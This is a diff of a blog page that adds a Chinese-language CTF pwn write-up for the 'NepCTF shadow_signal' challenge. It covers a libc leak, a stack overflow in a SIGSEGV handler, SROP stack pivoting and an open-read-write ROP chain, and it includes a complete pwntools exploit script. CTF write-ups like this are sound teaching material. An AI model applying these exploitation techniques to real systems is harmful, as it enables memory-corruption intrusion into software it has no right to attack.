@@ -42,6 +42,10 @@
 
 
 
+
+
+
+
 <link rel="stylesheet" href="/css/main.css?v=20260701-link-parallax" />
 
 <meta name="generator" content="Hexo 8.1.2"></head>
@@ -67,7 +71,7 @@
         data-enable="1"
         data-active-title="Hello(*^▽^*)"
         data-active-delay="2600"
-        data-default-title="分类: CTF | 0xt5 Blog"
+        data-default-title="NepCTF shadow_signal | 0xt5 Blog"
         data-inactive-title="∑(っ°Д°;)っ诶卧槽，不见了"
         data-inactive-scroll-speed="180"
         hidden
@@ -236,12 +240,20 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            
-<div id="archives">
-    <div class="categories-tags">
+            <div class="article">
+    <div>
+        <h1>NepCTF shadow_signal</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/7/21
+        </span>
         
-        <span>
-            <a href="/categories/CTF/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
+        <span class="category">
+            <a href="/categories/CTF/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
@@ -249,191 +261,239 @@
             </a>
         </span>
         
-        <span>
-            <a href="/categories/%E5%BB%BA%E7%AB%99/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                建站
-            </a>
-        </span>
         
-        <span>
-            <a href="/categories/CTF/Pwn/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                Pwn
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
+                    Pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
+                    栈
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/shellcode/" data-tag-name="shellcode" data-tag-color-role="text">
+                    shellcode
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/srop/" data-tag-name="srop" data-tag-color-role="text">
+                    srop
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/orw/" data-tag-name="orw" data-tag-color-role="text">
+                    orw
+                </a>
+            </span>
+            
         </span>
         
     </div>
+    
+    <div class="content" v-pre>
+        <p>前置知识：</p>
+<blockquote>
+<p><code>sa_handler</code> 是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。<code>sigemptyset(&amp;act.sa_mask);</code> </p>
+<p><code>sa_mask</code> 表示：当 <code>handler</code> 正在执行时，临时屏蔽哪些信号。</p>
+<p><code>act.sa_handler = handler</code> 是什么意思？</p>
+<p><code>sa_handler</code> 是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。</p>
+<p><code>sigemptyset</code>，就是把集合清空：</p>
+<pre><code>不额外屏蔽其他信号
+</code></pre>
+<p><code>sa_handler</code>：</p>
+<pre><code>act.sa_handler = (__sighandler_t)handler;
+</code></pre>
+<p>意思是配置“信号来了以后调用哪个函数”。</p>
+<p>Linux 处理信号时，会在用户栈上布置一个信号帧。这个信号帧里不只是保存寄存器，还会安排一个“返回地址”。当 signal handler 执行完 <code>ret</code> 时，它不是直接回到原来崩溃指令，而是先回到这个 restorer。</p>
+</blockquote>
+<p>这道题主要用到的方法</p>
+<p>shellcode，srop，orw</p>
+<p><img src="/images/nepctf-shadow-signal/image-20260718111526449.png" alt="image-20260718111526449"></p>
+<p>这里的保护不过多赘述了</p>
+<p>然后放入ida查看</p>
+<p><img src="/images/nepctf-shadow-signal/image-20260718111624162.png" alt="image-20260718111624162"></p>
+<p>发现有gift 这里打印出来的是stdout偏移后的地址</p>
+<p>这里也就相当于给了libc基址了</p>
+<p>然后可以构造一下</p>
+<pre><code class="language-py">r.recvuntil(b&quot;gift: &quot;)
+leak = int(r.recvline().strip(), 16)
+libc_base = leak - libc.sym[&quot;_IO_2_1_stdout_&quot;]
+</code></pre>
+<p>为什么减 <code>_IO_2_1_stdout_</code>？因为打印出来的 <code>stdout</code> 实际指向 **libc 里的 FILE 结构 <code>_IO_2_1_stdout_</code>。**泄露值是：</p>
+<pre><code>libc_base + libc.sym[&quot;_IO_2_1_stdout_&quot;]
+</code></pre>
+<p>所以反过来：</p>
+<pre><code>libc_base = leak - _IO_2_1_stdout_
+</code></pre>
+<p>有了libc基址之后我们就可以进行利用所有的libc gadget read syscall；ret</p>
+<p>后面的</p>
+<pre><code class="language-c">read(0, &amp;buf, 8u);
+puts(buf);
+</code></pre>
+<p>这里主要输入一个错误地址，然后puts进行取地址的时候触发段错误</p>
+<pre><code>11 = SIGSEGV = 段错误
+</code></pre>
+<p>之后触发段错误之后</p>
+<p><img src="/images/nepctf-shadow-signal/image-20260721092220341.png" alt="image-20260721092220341"></p>
+<p><code>sigaction(sig, act, oldact)</code> 的意思是：给某个信号注册处理函数。</p>
+<p>当程序收到 SIGSEGV 时，调用 handler</p>
+<p>程序会去handler里面</p>
+<p>在handler里面可以看到明显的栈溢出</p>
+<p><img src="/images/nepctf-shadow-signal/image-20260721092626660.png" alt="image-20260721092626660"></p>
+<p>但是后面的if函数 这里的意思是如果返回地址被覆盖就结束程序</p>
+<p>所以我们要把返回地址填进去</p>
+<p>handler 的返回地址指向 libc 里的 signal restorer 代码<br>而这个 restorer 代码里面有 syscall 也就是说，栈上的返回地址是一个地址值</p>
+<p>这里可以在gdb中进行调试查看 当遇到段错误停下时可以输入下面的这个</p>
+<pre><code>handle SIGSEGV nostop noprint pass
+</code></pre>
+<p>含义：</p>
+<pre><code>nostop  GDB 不在 SIGSEGV 停下
+noprint 不打印 SIGSEGV 信息
+pass    把 SIGSEGV 传递给程序
+</code></pre>
+<p>然后下断点查看返回地址 </p>
+<p><img src="/images/nepctf-shadow-signal/image-20260721100306474.png" alt="image-20260721100306474"></p>
+<p>这里通过泄露libc基址可以知道这个返回地址的偏移0x42520</p>
+<p>然后内核根据fake frame 恢复寄存器 这时候我们需要把rsp切换到bss段</p>
+<pre><code class="language-py">frame = SigreturnFrame(kernel=&quot;amd64&quot;)
+frame.rdi = 0
+frame.rsi = bss
+frame.rdx = 0x500
+frame.rsp = bss
+frame.rip = read_addr
+</code></pre>
+<p>之后可以通过ROP在libc里面搜索需要用到的pop rdi pop rsi等地址</p>
+<p>之后再构造寄存器链 orw链</p>
+<pre><code class="language-py">rop = flat(
+    pop_rax, 2,
+    pop_rdi, path_addr,
+    pop_rsi, 0,
+    pop_rdx_rbx, 0, 0,
+    syscall_ret,
 
-    
-    
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2026/7/21</div>
-            <a href="/2026/07/21/NepCTF%20shadow_signal/">
-                <h3>NepCTF shadow_signal</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/CTF/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        CTF
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
-                            Pwn
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
-                            栈
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/shellcode/" data-tag-name="shellcode" data-tag-color-role="text">
-                            shellcode
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/srop/" data-tag-name="srop" data-tag-color-role="text">
-                            srop
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/orw/" data-tag-name="orw" data-tag-color-role="text">
-                            orw
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    pop_rax, 0,
+    pop_rdi, 3,
+    pop_rsi, flag_buf,
+    pop_rdx_rbx, 0x100, 0,
+    syscall_ret,
+
+    pop_rax, 1,
+    pop_rdi, 1,
+    pop_rsi, flag_buf,
+    pop_rdx_rbx, 0x100, 0,
+    syscall_ret,
+)
+</code></pre>
+<p>之后就不用说了</p>
+<p>完整的exp</p>
+<pre><code class="language-py">#!/usr/bin/env python3
+from pwn import *
+
+context.arch = &quot;amd64&quot;
+context.log_level = &quot;info&quot;
+#context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+
+elf = ELF(&quot;./shadow_signal&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+r = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;--library-path&quot;, &quot;.&quot;, &quot;./shadow_signal&quot;])
+
+r.recvuntil(b&quot;gift: &quot;)
+leak = int(r.recvline().strip(), 16)
+libc_base = leak - libc.sym[&quot;_IO_2_1_stdout_&quot;]
+
+log.success(&quot;stdout leak = &quot; + hex(leak))
+log.success(&quot;libc base   = &quot; + hex(libc_base))
+
+#gdb.attach(r)
+
+bss = 0x406000
+restorer = libc_base + 0x42520
+read_addr = libc_base + libc.sym[&quot;read&quot;]
+
+pop_rdi = libc_base + 0x2a3e5
+pop_rsi = libc_base + 0x2be51
+pop_rdx_rbx = libc_base + 0x904a9
+pop_rax = libc_base + 0x45eb0
+syscall_ret = libc_base + 0x91316
+
+path = b&quot;./flag&quot;
+path_addr = bss + 0x300
+flag_buf = bss + 0x380
+
+r.send(p64(0xdeadbeef))
+r.recvuntil(b&quot;signal\n&quot;)
+
+frame = SigreturnFrame(kernel=&quot;amd64&quot;)
+frame.rdi = 0
+frame.rsi = bss
+frame.rdx = 0x500
+frame.rsp = bss
+frame.rip = read_addr
+
+payload = b&quot;A&quot; * 0x118
+payload += p64(restorer)
+payload += bytes(frame)
+
+r.send(payload)
+sleep(0.05)
+
+rop = flat(
+    pop_rax, 2,
+    pop_rdi, path_addr,
+    pop_rsi, 0,
+    pop_rdx_rbx, 0, 0,
+    syscall_ret,
+
+    pop_rax, 0,
+    pop_rdi, 3,
+    pop_rsi, flag_buf,
+    pop_rdx_rbx, 0x100, 0,
+    syscall_ret,
+
+    pop_rax, 1,
+    pop_rdi, 1,
+    pop_rsi, flag_buf,
+    pop_rdx_rbx, 0x100, 0,
+    syscall_ret,
+)
+
+payload2 = rop.ljust(0x300, b&quot;\x00&quot;)
+payload2 += path
+payload2 += b&quot;\x00&quot;
+
+r.send(payload2)
+
+data = r.recv(timeout=2)
+print(data.rstrip(b&quot;\x00&quot;).decode(&quot;latin-1&quot;, &quot;replace&quot;))
+
+r.interactive()
+</code></pre>
+<p>如果要修改flag的位置可以修改path &#x3D; b”.&#x2F;flag”</p>
+<p><img src="/images/nepctf-shadow-signal/image-20260721103800085.png" alt="image-20260721103800085"></p>
+
     </div>
     
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2026/6/20</div>
-            <a href="/2026/06/20/somehash/">
-                <h3>somehash</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/CTF/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        CTF
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
-                            Pwn
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
-                            栈
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" data-tag-name="非栈上格式化字符串" data-tag-color-role="text">
-                            非栈上格式化字符串
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
     </div>
     
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2026/5/23</div>
-            <a href="/2026/05/23/litctf-2026-ret2libc/">
-                <h3>LitCTF 2026 - ret2libc</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/CTF/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        CTF
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/%E5%9F%BA%E7%A1%80%E9%A2%98/" data-tag-name="基础题" data-tag-color-role="text">
-                            基础题
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/ret2libc/" data-tag-name="ret2libc" data-tag-color-role="text">
-                            ret2libc
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
-                            Pwn
-                        </a>
-                    </span>
-                    
-                    <span class="tag">
-                        <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
-                            栈
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
-    </div>
+    
     
     
 </div>
@@ -466,6 +526,65 @@
         
     </div>
     <script src="/js/particlex-main.js?v=20260701-link-parallax-strong"></script>
+    
+    
+<script>
+    (() => {
+        const container = document.getElementById("giscus-container");
+        if (!container || container.children.length) return;
+
+        window.__particlexGiscusTheme = () =>
+            document.documentElement.getAttribute("data-theme") === "dark"
+                ? "dark"
+                : "light";
+
+        const syncGiscusTheme = () => {
+            const iframe = document.querySelector("iframe.giscus-frame");
+            iframe?.contentWindow?.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: window.__particlexGiscusTheme
+                                ? window.__particlexGiscusTheme()
+                                : "light",
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        };
+
+        const script = document.createElement("script");
+        script.src = "https://giscus.app/client.js";
+        script.setAttribute("data-repo", "0xt5/0xt5.github.io");
+        script.setAttribute("data-repo-id", "R_kgDOSjkfWg");
+        script.setAttribute("data-category", "Announcements");
+        script.setAttribute("data-category-id", "DIC_kwDOSjkfWs4C_iFg");
+        script.setAttribute("data-mapping", "pathname");
+        script.setAttribute("data-strict", "0");
+        script.setAttribute("data-reactions-enabled", "1");
+        script.setAttribute("data-emit-metadata", "0");
+        script.setAttribute("data-input-position", "bottom");
+        script.setAttribute("data-theme", window.__particlexGiscusTheme());
+        script.setAttribute("data-lang", "zh-CN");
+        script.setAttribute("crossorigin", "anonymous");
+        script.async = true;
+        container.appendChild(script);
+
+        window.__particlexCommentThemeSync = syncGiscusTheme;
+        window.addEventListener("message", (event) => {
+            if (event.origin === "https://giscus.app" && event.data?.giscus) {
+                syncGiscusTheme();
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+
     
 </body>
 </html>
